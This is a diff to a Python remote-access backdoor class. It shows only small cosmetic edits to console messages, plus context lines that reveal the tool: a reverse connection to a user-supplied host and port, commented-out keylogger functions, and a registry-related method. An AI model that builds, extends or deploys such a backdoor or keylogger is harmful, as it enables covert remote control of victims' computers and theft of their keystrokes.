@@ -37,11 +37,11 @@ class Backdoor:
             self.port = int(input("\033[1;36mPut here the RPORT:\033[0;0m "))  # Comment this for using direct connection
 
         except KeyboardInterrupt:
-            print("Exiting... Bye o/")
+            print("\nExiting... Bye o/")
             sys.exit()
         
         except:
-            print("Wrong Input! Exiting...")
+            print("\nWrong Input! Exiting...")
             sys.exit()
     # OBS: THE 2 BELOW FUNCTIONS IS TO KEYLOGGER, BUT I CAN'T GARANTEE IF IT WILL WORK WITH LARGE RANGES, UNCOMMENT TO TRY IF YOU WANT
 
@@ -78,11 +78,11 @@ class Backdoor:
                 time.sleep(1)
                 print('\033[31m[-] *\033[0;0m \033[1;36mInitiating Connection...\033[0;0m')
                 self.sock.connect((self.host, self.port))
-                print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m') # kkkkkk,kmkkk
+                print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m')
                 connected = True
 
             except KeyboardInterrupt:
-                print("Exiting... Bye o/")
+                print("\nExiting... Bye o/")
                 sys.exit()
 
             except:
@@ -263,14 +263,14 @@ class Backdoor:
                         self.sock.send(str(e).encode())"""
 
             except BrokenPipeError:
-                print("\nConnection Reseted! Exiting...")
+                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
                 sys.exit()
 
             except KeyboardInterrupt:
                 print("\nExiting... Bye o/")
             
             except ConnectionResetError:
-                print("\nConnection Reseted! Exiting...")
+                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
 
             #self.sock.close()
     def winreg(self,file, path):
